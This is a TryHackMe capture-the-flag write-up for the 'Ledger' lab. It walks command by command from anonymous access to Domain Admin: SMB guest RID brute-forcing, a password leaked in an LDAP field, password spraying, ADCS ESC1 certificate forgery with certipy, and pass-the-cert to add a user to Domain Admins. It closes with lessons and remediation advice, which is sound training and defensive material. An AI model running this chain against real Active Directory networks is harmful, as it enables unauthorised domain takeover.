# Ledger — TryHackMe Writeup

> **Room:** [Ledger](https://tryhackme.com/room/ledger) · **Difficulty:** Medium
> **Category:** Active Directory (enumeration → ADCS ESC1 → pass-the-cert)
> **Author of writeup:** 0xnyx
> **Goal:** "Exploit an Active Directory." Go from an anonymous network position to Domain Admin.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the method.

---

## How to read this writeup

Each step is **Do** → **You get** → **Why / what next**. The chain is 5 links:

`SMB guest + RID brute → LDAP description leak → password spray + RDP (user) → ADCS ESC1 cert request → pass-the-cert over LDAP/Schannel → Domain Admin (root)`

---

## Step 1 — Recon

**Do**

```bash
echo "<TARGET> thm.local labyrinth.thm.local" | sudo tee -a /etc/hosts
nmap -sVC -T4 -Pn -p- --min-rate 2000 <TARGET>
```

**You get** — A classic **Domain Controller** footprint: DNS (53), Kerberos (88/464), RPC (135), SMB (139/445), LDAP (389/636/3268/3269), RDP (3389), ADWS (9389). Key facts from the scan:

- Domain **`thm.local`**, host **`LABYRINTH`** (from RDP NTLM info).
- 443 certificate subject **`CN=thm-LABYRINTH-CA`** → an **AD Certificate Services** CA is present.
- SMB signing **required**; no WinRM (5985) exposed.

**Why / what next** — No WinRM means foothold will be **RDP**. The CA on 443 flags **ADCS** as a likely privesc path. With no creds yet, start with guest/anonymous enumeration.

---

## Step 2 — SMB guest enumeration + RID brute-force

**Do** — The box allows **null/guest auth**, so enumerate shares and brute-force RIDs to harvest usernames.

```bash
netexec smb <TARGET> -u guest -p '' --shares
netexec smb <TARGET> -u guest -p '' --rid-brute 5000 | grep SidTypeUser
```

**You get** — `guest` logs in; `IPC$` is READ. RID brute-force dumps **~400 domain users** (e.g. `IVY_WILLIS`, `SUSANNA_MCKNIGHT`, `BRADLEY_ORTIZ`). Save them to `users.txt`.

**Why / what next** — A user list alone isn't access. Pair it with **LDAP anonymous bind** — admins sometimes stash passwords in the `description` field.

---

## Step 3 — LDAP description leak

**Do**

```bash
ldapsearch -x -H ldap://<TARGET> -b "DC=thm,DC=local" "(objectClass=user)" sAMAccountName description \
  | grep -iE "sAMAccountName:|description:"
```

**You get** — Most users read `description: Tier 1 User`, but **two** stand out with a reused default password:

```
sAMAccountName: IVY_WILLIS         description: Please change it: <PASSWORD>
sAMAccountName: SUSANNA_MCKNIGHT   description: Please change it: <PASSWORD>
```

**Why / what next** — The password was never changed. Validate it with a spray, then find which account can log in somewhere.

---

## Step 4 — Password spray + RDP foothold (user flag)

**Do**

```bash
printf 'IVY_WILLIS\nSUSANNA_MCKNIGHT\n' > users.txt
netexec smb   <TARGET> -u users.txt -p '<PASSWORD>' --continue-on-success
netexec rdp   <TARGET> -u users.txt -p '<PASSWORD>' --continue-on-success
```

**You get** — Both creds are valid over SMB. `SUSANNA_MCKNIGHT` shows **`(Pwn3d!)`** on RDP (she's in Remote Desktop/Management Users). Connect:

```bash
xfreerdp3 /v:<TARGET> /u:SUSANNA_MCKNIGHT /p:'<PASSWORD>' /cert:ignore /dynamic-resolution +clipboard
# in the session:
#   type %USERPROFILE%\Desktop\user.txt      <- USER FLAG
```

**Why / what next** — Foothold as a low-priv domain user. Now hunt a privesc path — the CA from Step 1 says **check ADCS**.

---

## Step 5 — Find the ADCS misconfiguration (ESC1)

**Do** — From Kali, scan the CA for vulnerable templates.

```bash
certipy-ad find -u SUSANNA_MCKNIGHT@thm.local -p '<PASSWORD>' -dc-ip <TARGET> -vulnerable -stdout
```

**You get** — Template **`ServerAuth`** is flagged **ESC1**:

- `Enrollee Supplies Subject : True` (requester chooses the SAN)
- `Client Authentication : True` (cert can log in)
- `Enrollment Rights : Authenticated Users` (any domain user can enroll)
- `Requires Manager Approval : False`

**Why / what next** — ESC1 means **any authenticated user can request a cert for ANY identity** — including `administrator`. Request one as Administrator.

---

## Step 6 — Request a certificate as Administrator

> **THM DNS gotcha:** `certipy req` resolves the CA's DNS name through the DC, which returns the box's **internal** IP (e.g. `10.10.x.x`) — unreachable over the VPN. `certipy` ignores `/etc/hosts` and uses its own resolver, so point it at a local fake-DNS that answers every name with the real VPN IP.

**Do**

```bash
# fake DNS: every A record -> the real VPN IP
sudo dnschef --fakeip <TARGET> -q &

# enroll as Administrator (SAN UPN) via the ESC1 template, using our local DNS
certipy-ad req -u SUSANNA_MCKNIGHT@thm.local -p '<PASSWORD>' \
  -ns 127.0.0.1 -dc-ip <TARGET> \
  -ca thm-LABYRINTH-CA -template ServerAuth -upn administrator@thm.local
```

**You get** — `administrator.pfx` (a login certificate that claims to be the domain Administrator).

> The cert-request RPC on a freshly-booted THM box is flaky — if it reports an endpoint-mapper / NETBIOS timeout, just re-run it a couple of times until it connects.

---

## Step 7 — Pass-the-cert → Domain Admin (root flag)

**Do** — Normally you'd `certipy auth` the PFX into a TGT, but this DC rejects PKINIT:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <TARGET> -ns 127.0.0.1
# -> KDC_ERR_PADATA_TYPE_NOSUPP   (DC has no PKINIT support)
```

**Why / what next** — No PKINIT, but the cert still authenticates over **LDAP/Schannel**. Use `-ldap-shell` to bind **as Administrator**, then add our controlled user to **Domain Admins**:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <TARGET> -ns 127.0.0.1 -ldap-shell
# in the LDAP shell:
#   add_user_to_group SUSANNA_MCKNIGHT "Domain Admins"
#   exit
```

**You get** — `SUSANNA_MCKNIGHT` is now a Domain Admin. Since group membership is evaluated at logon, a **fresh** NTLM logon with her existing password is privileged:

```bash
impacket-wmiexec thm.local/SUSANNA_MCKNIGHT:'<PASSWORD>'@<TARGET>
# C:\> type C:\Users\Administrator\Desktop\root.txt     <- ROOT FLAG
```

**You get** — A `C:\` shell on the DC and the **root flag**. Domain owned. 🏁

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap | DC + ADCS CA (`thm-LABYRINTH-CA`) |
| 2 | SMB guest + RID brute | ~400 usernames |
| 3 | LDAP anonymous bind | password leaked in `description` |
| 4 | Spray + RDP | user flag (SUSANNA_MCKNIGHT) |
| 5 | `certipy find` | ESC1 on `ServerAuth` |
| 6 | `certipy req -upn administrator` | Administrator cert (`.pfx`) |
| 7 | Pass-the-cert (LDAP/Schannel) + group add | Domain Admin → root flag |

## Lessons

- **Guest/null SMB + RID brute** turns an anonymous position into a full user list; **LDAP anonymous bind** then leaks whatever admins typed into `description`.
- **ADCS ESC1** (`EnrolleeSuppliesSubject` + Client Auth + broad enroll + no approval) lets any authenticated user mint a cert for **any** principal, including Administrator.
- When **PKINIT is unsupported** (`KDC_ERR_PADATA_TYPE_NOSUPP`), don't stop — a login cert still works over **LDAP/Schannel** ("pass-the-cert") to change passwords, add group members, or set RBCD.
- **THM split-DNS trap:** the DC's DNS hands back an internal IP. `certipy` uses its own resolver (not `/etc/hosts`), so run `dnschef --fakeip <VPN_IP>` and pass `-ns 127.0.0.1`.

## Remediation

- Disable guest/anonymous SMB and LDAP anonymous binds; never store passwords in AD `description` fields; enforce password change on first logon.
- Harden the `ServerAuth` template: remove `EnrolleeSuppliesSubject`, require manager approval, and restrict enrollment rights away from `Authenticated Users`.
- Enable strong certificate mapping / PKINIT hardening and monitor Certificate Services enrollment for off-pattern SANs.

---

*Write-up for [TryHackMe — Ledger](https://tryhackme.com/room/ledger).*
